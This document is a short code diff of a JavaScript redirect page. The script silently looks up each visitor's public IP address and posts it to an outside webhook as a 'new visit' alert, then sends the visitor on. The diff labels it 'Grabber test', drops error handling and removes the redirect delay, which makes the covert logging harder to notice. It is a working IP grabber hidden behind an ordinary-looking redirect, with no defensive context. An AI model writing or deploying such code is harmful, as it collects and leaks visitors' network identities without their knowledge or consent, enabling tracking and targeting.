@@ -5,25 +5,20 @@ fetch('https://api.ipify.org?format=json')
   .then(response => response.json())
   .then(data => {
     const ip = data.ip;
-
     const webhookData = {
       embeds: [{
         title: "Nowe wejście na stronę",
         description: `Adres IP: **${ip}**`,
         color: 5814783,
-        footer: { text: "głabeł" },
+        footer: { text: "Grabber test by juliu" },
         timestamp: new Date().toISOString()
       }]
     };
-
     fetch(webhookUrl, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(webhookData)
-    }).catch(e => console.error('Błąd wysyłki webhooka:', e));
-  })
-  .catch(e => console.error('Błąd pobierania IP:', e));
+    });
+  });
 
-setTimeout(function() {
-  window.location.href = redirectUrl;
-}, 5000);
+window.location.href = redirectUrl;
